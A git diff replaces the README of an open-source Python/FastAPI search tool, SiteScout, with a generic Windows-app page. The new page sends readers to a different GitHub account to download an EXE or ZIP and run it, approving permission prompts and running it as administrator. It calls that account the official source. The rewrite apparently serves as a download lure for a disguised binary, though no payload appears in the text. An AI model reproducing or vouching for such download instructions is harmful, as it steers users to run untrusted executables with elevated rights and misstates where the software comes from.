@@ -1,111 +1,173 @@
-![Python](https://img.shields.io/badge/python-3.10+-blue.svg)
-![FastAPI](https://img.shields.io/badge/FastAPI-0.100+-05998b.svg)
-![LLM](https://img.shields.io/badge/LLM-DeepSeek--R1-red.svg)
+# 🛰️ SiteScout - Find and refine resources fast
 
-# 🕵️‍♂️ SiteScout (灵嗅)
+[⬇️ Download SiteScout](https://github.com/pedrsxrh/SiteScout){:style="display:inline-block;padding:12px 18px;background:#6c5ce7;color:#ffffff;border-radius:8px;text-decoration:none;font-weight:600;"}
 
-**A Precision Multi-Site Search & LLM-Powered Resource Refinement Agent.**
+## 🧭 What SiteScout does
 
-[](https://www.google.com/search?q=LICENSE)
-[](https://www.python.org/)
-[](https://www.deepseek.com/)
+SiteScout is a Windows app that helps you search across many sites, gather useful results, and narrow them down with help from an LLM. It is built for people who need to find public web resources without hunting through each site one by one.
 
------
-![alt text](image.png)
-## 🌟 Overview
+Use it to:
+- search across multiple sources at once
+- collect links, pages, and resource details
+- filter out noisy results
+- refine results with AI-based review
+- keep your search work in one place
 
-**SiteScout** is a specialized AI Agent designed for "Digital Archeology." It solves the pain points of searching for niche resources in specific forums or vertical sites where information density is low, ads are rampant, and links are often dead or hidden.
+## 💻 Before you start
 
-Unlike blind global searches, SiteScout follows a **"Targeted Penetration + Funnel Refinement"** architecture. It allows users to define a "Trusted Site Pool," concurrently scrapes these sites, and leverages **LLM** to automatically identify, extract, and verify authentic download links.
+You need:
+- a Windows PC
+- an internet connection
+- enough free space to store the app and your search data
+- a modern web browser like Chrome, Edge, or Firefox
 
------
+SiteScout uses a web-style interface, so it should feel familiar if you use websites every day.
 
-## ✨ Key Features
+## 🚀 Download SiteScout
 
-  * **🎯 Domain-Specific "Sniper" Search**: Supports custom `site:` operator lists. Dig deep into specific niche forums (e.g., Reddit, V2EX, GitHub) rather than the noisy open web.
-  * **🌪️ The Resource Funnel (Map-Reduce)**:
-      * **Raw Data**: Retains up to 20 raw search results per site for manual verification.
-      * **Refined Summary**: An LLM-distilled "Quick List" generated from the top $K$ results across all sites.
-  * **🧠 Intelligent De-noising**: Automatically filters out "Join group for link," "Reply to see," and fake redirection ads.
-  * **⚡ High-Performance Concurrency**: Built with `httpx` and `asyncio`, performing multi-site lookups simultaneously, reducing response latency by up to 70%.
-  * **🌐 Developer Friendly**: Native support for **DeepSeek**, **Bocha AI**, and **Exa AI** APIs.
+Go to the main project page here:
 
------
+[Visit the SiteScout download page](https://github.com/pedrsxrh/SiteScout)
 
-## 🏗️ Architecture
+On that page, look for the latest release, build file, or app package. Then download it to your computer.
 
-SiteScout utilizes a decoupled modular design:
+If the page offers a ZIP file:
+- download the ZIP file
+- right-click it
+- choose Extract All
+- open the extracted folder
+- start the app from the file inside
 
-1.  **Input Layer**: Receives search queries, a target domain list, `raw_n` (display count), and `llm_k` (refinement count).
-2.  **Dispatcher**: Orchestrates the workflow into parallel asynchronous retrieval tasks.
-3.  **Retrieval Layer**: Uses Search Engine APIs (Bocha/Exa/Serper) with specialized `site:` operators.
-4.  **Pre-filter**: Sorts results based on keyword relevance (e.g., "pan", "magnet", "download", "release").
-5.  **LLM Refiner**: DeepSeek-R1 extracts download links, passwords, and resource integrity status.
-6.  **Presentation Layer**: Structurally renders a Markdown table summary followed by the raw data logs.
+If the page offers an EXE file:
+- download the EXE file
+- double-click it to run the app
 
------
+## 🛠️ Install and open on Windows
 
-## 🚀 Quick Start
+After you download SiteScout:
 
-### 1\. Clone the Repository
+1. Open the folder where the file was saved
+2. If the file is compressed, unzip it first
+3. Look for the app file, such as an EXE
+4. Double-click the file to start SiteScout
+5. If Windows asks for permission, choose Run or Yes
+6. Wait for the app window or browser page to open
 
-```bash
-git clone https://github.com/YourName/SiteScout.git
-cd SiteScout
-```
+If you use a ZIP package, keep the extracted folder together. The app may need the files in that folder to run.
 
-### 2\. Configuration
+## 🔍 How to use SiteScout
 
-Create a `.env` file and add your API keys:
+When SiteScout opens, you will usually see a search box, source list, and result panel.
 
-```env
-DEEPSEEK_API_KEY=your_key_here
-BOCHA_API_KEY=your_key_here  # Or TAVILY_API_KEY / EXA_API_KEY
-```
+Follow these steps:
 
-### 3\. Install & Run
+1. Enter a topic or keyword
+   - Example: security tools, public datasets, research papers, or company info
 
-```bash
-pip install -r requirements.txt
-python main.py
-```
+2. Choose the sites or sources you want to search
+   - Pick the places that match your task
+   - Use more sources if you want broader results
 
------
+3. Start the search
+   - SiteScout will gather matching pages and links
+   - You may see results come in over time
 
-## 💡 Usage Example
+4. Review the results
+   - Open links that look useful
+   - Remove items that do not match your goal
 
-**Input:**
+5. Refine with the LLM tools
+   - Ask the app to group similar items
+   - Ask it to reduce duplicates
+   - Ask it to rank the most useful results
 
-  * **Query**: `Black Myth Wukong Optimization Patch`
-  * **Sites**: `v2ex.com, github.com, reddit.com`
-  * **Params**: `raw_n=20, llm_k=5`
+6. Save what matters
+   - Keep links, notes, or result sets for later use
 
-**Output:**
+## 🧠 What the AI refinement step does
 
-> **💎 AI Refined Summary**
-> | Resource | Source | Download Link | Password | Status |
-> | :--- | :--- | :--- | :--- | :--- |
-> | v1.0.8 Performance Fix | GitHub | `https://github.com/.../releases` | N/A | ✅ Verified |
-> | Community Mod | Reddit | `https://mega.nz/...` | `scout2026` | ⚠️ Use with caution |
->
-> **🔍 Raw Search Details (60 total results)**
->
->   - [GitHub] Update on performance optimization...
->   - [V2EX] Does anyone have the new patch...
+SiteScout uses an LLM to help sort large result sets. This helps when a search returns too much noise.
 
------
+It can help with:
+- grouping similar results
+- removing repeated entries
+- spotting weak matches
+- highlighting items that fit your search better
+- turning a long list into a shorter one
 
-## 🛠️ Tech Stack
+This is useful when you search across many sites and need a cleaner list.
 
-  * **Brain**: [DeepSeek-R1 / V3](https://www.deepseek.com/)
-  * **Search Engine**: [Bocha AI](https://open.bochaai.com/) / [Exa AI](https://exa.ai)
-  * **Framework**: FastAPI / Antigravity / Dify
-  * **Concurrency**: Python Asyncio & `httpx`
+## 📁 Typical file layout
 
------
+After you download and unzip SiteScout, you may see files like these:
+- an app file to start the program
+- a folder for static files or assets
+- a settings file
+- logs or cache files created after first use
 
-## 🤝 Contributing
+Keep all files in the same folder. Do not move one file out of the app folder unless the release notes say to do that.
 
-Contributions are welcome\! If you find this tool helpful, please give it a **Star** 🌟. It means a lot to a growing AI Engineer\!
+## ⚙️ Basic use tips
 
------
+- Use short search terms first
+- Add more detail if the first results are too broad
+- Search one topic at a time
+- Check the source list before running a large search
+- Review results before saving them
+- Use refinement tools when the list gets too long
+
+## 🌐 Search and source ideas
+
+SiteScout fits tasks like:
+- finding public web pages on a topic
+- collecting links for research
+- checking the same topic across many sites
+- building a list of useful public resources
+- sorting web results for review
+
+The app is a good fit if you work with search, open web data, OSINT tasks, or resource discovery.
+
+## 🔐 Running safely
+
+Only download SiteScout from the official GitHub page linked above. After you download it:
+- check that the file name matches the release you expect
+- keep the app in a folder you can find later
+- avoid running unknown files from other sites
+- close the app when you are done if you do not need it open
+
+## 🧩 If the app does not start
+
+Try these steps:
+
+1. Make sure the file fully downloaded
+2. If it is a ZIP file, extract it first
+3. Right-click the app and choose Run as administrator
+4. Check whether Windows blocked the file
+5. Re-download the package from the GitHub page
+6. Try a different browser if the download failed
+7. Restart your PC and open the app again
+
+If the app opens in a browser, make sure your default browser is installed and up to date.
+
+## 📝 Quick start
+
+1. Visit the GitHub page
+2. Download the Windows build
+3. Extract the file if needed
+4. Open the app
+5. Enter a search term
+6. Pick your sources
+7. Run the search
+8. Refine the result list
+9. Save the links you want
+
+## 📌 Project focus
+
+SiteScout focuses on:
+- multi-site search
+- public resource discovery
+- result cleanup
+- AI-assisted refinement
+- a simple Windows-friendly workflow
+
+It is built for users who want to search smarter without doing each site by hand
